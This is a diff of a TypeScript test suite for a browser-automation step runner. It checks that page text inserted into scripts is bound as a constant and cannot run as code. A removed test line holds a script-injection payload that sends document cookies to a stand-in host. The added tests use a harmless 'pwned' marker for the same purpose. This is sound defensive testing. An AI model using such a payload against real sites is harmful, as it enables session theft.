@@ -151,27 +151,56 @@ suite('Paradis run_steps flow (E6)', () => {
 			other: paradisRunStepsFlowDescriptor(other) === other,
 		}, { properties: ['steps', 'continue_on_error', 'max_seconds'], mentions: true, other: true });
 	});
-	test('a reference inside a script is inserted as a quoted string value, so text from a page cannot run as code', async () => {
-		const hostile = `')||fetch('//evil?'+document.cookie)||('`;
+	test('a reference inside a script is bound to a constant, so text from a page never runs as code wherever it is written', async () => {
+		const hostile = `x'+(globalThis.pwned=true)+' globalThis.pwned = true; /`;
+		const sources = {
+			expression: '() => $1.text + "!"',
+			template: '() => `<${$1.text}>`',
+			singleQuoted: `() => '$1.text'`,
+			htmlComment: '() => { const r = 1; <!-- $1.text\n return r; }',
+			regexAfterIf: '() => { if (true) /a$1.text/; return 2; }',
+		};
 		const fake = fakeCall(name => name === 'get_text' ? text(`Text of the whole page.\nShowing characters 0-40 of 40 (end).\n\n${hostile}`) : text('ok'));
 		await paradisRunStepsFlow(fake.call, {
 			steps: [
 				{ tool: 'get_text', args: {} },
-				{ tool: 'evaluate_script', args: { function: '() => document.title.includes($1.text)' } },
-				{ tool: 'wait_until', args: { predicate: '() => document.body.innerText.includes($1.text)' } },
-				{ expect: { predicate: '() => location.hash === $1.text', timeout_ms: 1000 } },
-				{ tool: 'navigate_page', args: { url: 'about:blank', initScript: 'window.lastTitle = $1.text;' } },
+				...Object.values(sources).map(source => ({ tool: 'evaluate_script', args: { function: source } })),
+				{ expect: { predicate: '() => $1.text.length > 0', timeout_ms: 1000 } },
 				{ tool: 'fill_by', args: { name: 'Search', value: '$1.text' } },
 			],
 		});
-		const quoted = JSON.stringify(hostile);
-		assert.deepStrictEqual(fake.calls.slice(1).map(call => JSON.parse(call.slice(call.indexOf(' ') + 1))), [
-			{ function: `() => document.title.includes(${quoted})` },
-			{ predicate: `() => document.body.innerText.includes(${quoted})`, timeout_seconds: 10 },
-			{ timeout_seconds: 1, predicate: `() => location.hash === ${quoted}` },
-			{ url: 'about:blank', initScript: `window.lastTitle = ${quoted};` },
-			{ name: 'Search', value: hostile },
-		]);
+		const sent = fake.calls.slice(1).map(call => JSON.parse(call.slice(call.indexOf(' ') + 1)) as Record<string, string>);
+		const globals = globalThis as { pwned?: boolean };
+		delete globals.pwned;
+		// 包んだ関数を評価して動かす（スクリプトとして読む。HTML 風のコメントも有効）
+		const run = (source: string) => (new Function(`return (${source});`) as () => () => unknown)()();
+		const results = sent.slice(0, 5).map(args => run(args.function));
+		const predicate = run(sent[5].predicate);
+		assert.deepStrictEqual({
+			// 引用符の中の参照は値にならず、識別子の名前の文字のまま
+			results: results.map((value, index) => index === 2 ? String(value).startsWith('__paraRef_') : value),
+			predicate,
+			pwned: globals.pwned,
+			fill: sent[6],
+		}, {
+			results: [`${hostile}!`, `<${hostile}>`, true, 1, 2],
+			predicate: true,
+			pwned: undefined,
+			fill: { name: 'Search', value: hostile },
+		});
+	});
+
+	test('a reference in initScript is refused, and a script without references is sent as written', async () => {
+		const parsed = paradisParseRunStepsFlow({ steps: [{ tool: 'get_text', args: {} }, { tool: 'navigate_page', args: { url: 'about:blank', initScript: 'window.lastTitle = $1.text;' } }] });
+		const fake = fakeCall(() => text('ok'));
+		await paradisRunStepsFlow(fake.call, { steps: [{ tool: 'evaluate_script', args: { function: '() => "$$1.text"' } }, { tool: 'navigate_page', args: { url: 'about:blank', initScript: 'window.price = "$$5";' } }] });
+		assert.deepStrictEqual({
+			refused: parsed.ok ? undefined : parsed.error,
+			calls: fake.calls,
+		}, {
+			refused: '"steps" step 2: references such as $2.text cannot be used in "initScript". Pass the value in a later evaluate_script instead.',
+			calls: ['evaluate_script {"function":"() => \\"$1.text\\""}', 'navigate_page {"url":"about:blank","initScript":"window.price = \\"$5\\";"}'],
+		});
 	});
 
 	test('waits inside a step are cut to the time left in the run', async () => {
